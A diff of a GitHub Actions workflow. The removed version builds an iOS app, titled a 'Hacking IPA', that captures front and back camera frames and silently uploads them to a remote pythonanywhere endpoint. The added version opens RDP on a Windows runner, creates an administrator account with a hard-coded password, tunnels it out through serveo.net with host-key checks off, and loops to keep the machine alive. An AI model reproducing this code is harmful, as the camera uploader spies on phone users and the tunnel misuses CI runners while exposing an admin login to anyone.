@@ -1,197 +1,57 @@
-# .github/workflows/build.yml
-name: Build iOS Hacking IPA
+name: RDP with Serveo
 
 on:
   workflow_dispatch:
 
 jobs:
-  build-ipa:
-    runs-on: macos-14
+  rdp-serveo:
+    runs-on: windows-latest
+    timeout-minutes: 360
+
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Compile iOS app manually
+      - name: Configure RDP
+        shell: powershell
         run: |
-          mkdir -p Payload/DualCameraStreamer.app
-          cd Payload/DualCameraStreamer.app
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          $password = ConvertTo-SecureString "YourStrongP@ssw0rd!" -AsPlainText -Force
+          New-LocalUser -Name "rdpuser" -Password $password -FullName "RDP User" -Description "GitHub Actions RDP"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "rdpuser"
+          Add-LocalGroupMember -Group "Administrators" -Member "rdpuser"
+          Restart-Service TermService -Force
 
-          cat > AppDelegate.swift << 'EOF'
-          import UIKit
-          import AVFoundation
-
-          @main
-          class AppDelegate: UIResponder, UIApplicationDelegate {
-              var window: UIWindow?
-              func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
-                  window = UIWindow(frame: UIScreen.main.bounds)
-                  window?.rootViewController = ViewController()
-                  window?.makeKeyAndVisible()
-                  return true
-              }
-          }
-          EOF
-
-          cat > ViewController.swift << 'EOF'
-          import UIKit
-          import AVFoundation
-
-          class ViewController: UIViewController {
-              private var multiCamSession: AVCaptureMultiCamSession?
-              private var frontOutput: AVCaptureVideoDataOutput?
-              private var backOutput: AVCaptureVideoDataOutput?
-              private let frontQueue = DispatchQueue(label: "front.capture")
-              private let backQueue = DispatchQueue(label: "back.capture")
-              private let serverURL = "https://fudu.pythonanywhere.com/upload"
-
-              override func viewDidLoad() {
-                  super.viewDidLoad()
-                  view.backgroundColor = .black
-                  requestPermissions()
-              }
-
-              private func requestPermissions() {
-                  AVCaptureDevice.requestAccess(for: .video) { granted in
-                      DispatchQueue.main.async {
-                          if granted {
-                              self.setupMultiCamSession()
-                          } else {
-                              fatalError("Camera permission denied")
-                          }
-                      }
-                  }
-              }
-
-              private func setupMultiCamSession() {
-                  guard AVCaptureMultiCamSession.isMultiCamSupported else { return }
-                  multiCamSession = AVCaptureMultiCamSession()
-                  guard let frontCamera = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: .front),
-                        let frontInput = try? AVCaptureDeviceInput(device: frontCamera),
-                        multiCamSession?.canAddInput(frontInput) == true else { return }
-                  multiCamSession?.addInput(frontInput)
-                  guard let backCamera = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: .back),
-                        let backInput = try? AVCaptureDeviceInput(device: backCamera),
-                        multiCamSession?.canAddInput(backInput) == true else { return }
-                  multiCamSession?.addInput(backInput)
-                  frontOutput = AVCaptureVideoDataOutput()
-                  frontOutput?.setSampleBufferDelegate(self, queue: frontQueue)
-                  frontOutput?.videoSettings = [kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA]
-                  if multiCamSession?.canAddOutput(frontOutput!) == true { multiCamSession?.addOutput(frontOutput!) }
-                  backOutput = AVCaptureVideoDataOutput()
-                  backOutput?.setSampleBufferDelegate(self, queue: backQueue)
-                  backOutput?.videoSettings = [kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA]
-                  if multiCamSession?.canAddOutput(backOutput!) == true { multiCamSession?.addOutput(backOutput!) }
-                  for connection in multiCamSession?.connections ?? [] {
-                      if let _ = connection.inputPorts.first,
-                         let _ = (connection.inputPorts.first?.input as? AVCaptureDeviceInput)?.device {
-                          connection.videoOrientation = .portrait
-                      }
-                  }
-                  multiCamSession?.startRunning()
-              }
-
-              private func sendFrame(imageData: Data, camera: String) {
-                  var request = URLRequest(url: URL(string: serverURL)!)
-                  request.httpMethod = "POST"
-                  let boundary = UUID().uuidString
-                  request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
-                  var body = Data()
-                  body.append("--\(boundary)\r\n".data(using: .utf8)!)
-                  body.append("Content-Disposition: form-data; name=\"camera\"; filename=\"\(camera).jpg\"\r\n".data(using: .utf8)!)
-                  body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
-                  body.append(imageData)
-                  body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)
-                  request.httpBody = body
-                  URLSession.shared.dataTask(with: request).resume()
-              }
-          }
-
-          extension ViewController: AVCaptureVideoDataOutputSampleBufferDelegate {
-              func captureOutput(_ output: AVCaptureOutput, didOutput sampleBuffer: CMSampleBuffer, from connection: AVCaptureConnection) {
-                  guard let imageBuffer = CMSampleBufferGetImageBuffer(sampleBuffer) else { return }
-                  let ciImage = CIImage(cvImageBuffer: imageBuffer)
-                  let context = CIContext()
-                  guard let cgImage = context.createCGImage(ciImage, from: ciImage.extent) else { return }
-                  let uiImage = UIImage(cgImage: cgImage)
-                  guard let jpegData = uiImage.jpegData(compressionQuality: 0.3) else { return }
-                  let cameraName = (connection.inputPorts.first?.input as? AVCaptureDeviceInput)?.device.position == .front ? "front" : "back"
-                  sendFrame(imageData: jpegData, camera: cameraName)
-              }
-          }
-          EOF
-
-          cat > Info.plist << 'EOF'
-          <?xml version="1.0" encoding="UTF-8"?>
-          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-          <plist version="1.0">
-          <dict>
-              <key>CFBundleExecutable</key>
-              <string>DualCameraStreamer</string>
-              <key>CFBundleIdentifier</key>
-              <string>com.hack.dualcamstreamer</string>
-              <key>CFBundleName</key>
-              <string>DualCameraStreamer</string>
-              <key>CFBundleDisplayName</key>
-              <string>DualCam</string>
-              <key>CFBundleVersion</key>
-              <string>1</string>
-              <key>CFBundleShortVersionString</key>
-              <string>1.0</string>
-              <key>LSRequiresIPhoneOS</key>
-              <true/>
-              <key>NSCameraUsageDescription</key>
-              <string>This app streams your camera</string>
-              <key>UILaunchStoryboardName</key>
-              <string>LaunchScreen</string>
-              <key>UIRequiredDeviceCapabilities</key>
-              <array><string>armv7</string></array>
-          </dict>
-          </plist>
-          EOF
-
-          mkdir -p Base.lproj
-          cat > Base.lproj/LaunchScreen.storyboard << 'EOF'
-          <?xml version="1.0" encoding="UTF-8"?>
-          <document type="com.apple.InterfaceBuilder3.CocoaTouch.Storyboard.XIB" version="3.0" toolsVersion="21507" targetRuntime="iOS.CocoaTouch" propertyAccessControl="none" useAutolayout="YES" launchScreen="YES" useTraitCollections="YES" useSafeAreas="YES" colorMatched="YES" initialViewController="01J-lp-oVM">
-              <dependencies><plugIn identifier="com.apple.InterfaceBuilder.IBCocoaTouchPlugin" version="21505"/></dependencies>
-              <scenes>
-                  <scene sceneID="EHf-IW-A2E">
-                      <objects>
-                          <viewController id="01J-lp-oVM" sceneMemberID="viewController">
-                              <view key="view" contentMode="scaleToFill" id="Ze5-6b-2t3">
-                                  <rect key="frame" x="0.0" y="0.0" width="375" height="667"/>
-                                  <color key="backgroundColor" red="0" green="0" blue="0" alpha="1" colorSpace="custom" customColorSpace="sRGB"/>
-                              </view>
-                          </viewController>
-                          <placeholder placeholderIdentifier="IBFirstResponder" id="iYj-Kq-Ea1" sceneMemberID="firstResponder"/>
-                      </objects>
-                      <point key="canvasLocation" x="52" y="375"/>
-                  </scene>
-              </scenes>
-          </document>
-          EOF
-
-          SDK_PATH=$(xcrun --show-sdk-path --sdk iphoneos)
-          swiftc -sdk "$SDK_PATH" -target arm64-apple-ios15.0 -emit-executable -o DualCameraStreamer AppDelegate.swift ViewController.swift -framework UIKit -framework AVFoundation -framework Foundation
-
-          if [ ! -f DualCameraStreamer ] || [ ! -s DualCameraStreamer ]; then
-              echo "❌ Compilation failed"
-              exit 1
-          fi
-          echo "✅ Executable size: $(ls -l DualCameraStreamer | awk '{print $5}') bytes"
-
-          # No need to codesign here; sign.dumpapp.com will handle it
-          echo "Ad-hoc signing skipped"
-
-          cd ../..
-
-      - name: Package IPA
+      - name: Start Serveo Tunnel
+        shell: powershell
         run: |
-          zip -r DualCamStreamer.ipa Payload/
-          echo "✅ IPA created: $(ls -lh DualCamStreamer.ipa)"
+          # Start SSH tunnel in background, capture logs
+          $ssh = Start-Process -FilePath "ssh" -ArgumentList @(
+            "-o", "StrictHostKeyChecking=no",
+            "-o", "ServerAliveInterval=60",
+            "-o", "ServerAliveCountMax=3",
+            "-R", "0:localhost:3389",
+            "serveo.net"
+          ) -RedirectStandardOutput "C:\serveo.log" -RedirectStandardError "C:\serveo.err" -WindowStyle Hidden -PassThru
+          Start-Sleep -Seconds 20
+          Write-Host "=== SERVEO LOG ==="
+          Get-Content "C:\serveo.log" -ErrorAction SilentlyContinue
+          Get-Content "C:\serveo.err" -ErrorAction SilentlyContinue
+          Write-Host "=================="
 
-      - name: Upload IPA
-        uses: actions/upload-artifact@v4
-        with:
-          name: DualCamStreamer.ipa
-          path: DualCamStreamer.ipa
+      - name: Print Credentials
+        shell: powershell
+        run: |
+          Write-Host "========================================"
+          Write-Host "RDP READY"
+          Write-Host "Host: serveo.net"
+          Write-Host "Port: check logs above for allocated port"
+          Write-Host "User = rdpuser"
+          Write-Host "Pass = YourStrongP@ssw0rd!"
+          Write-Host "========================================"
+
+      - name: Keep Alive
+        shell: powershell
+        run: |
+          while ($true) {
+            Start-Sleep -Seconds 60
+            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Alive..."
+          }
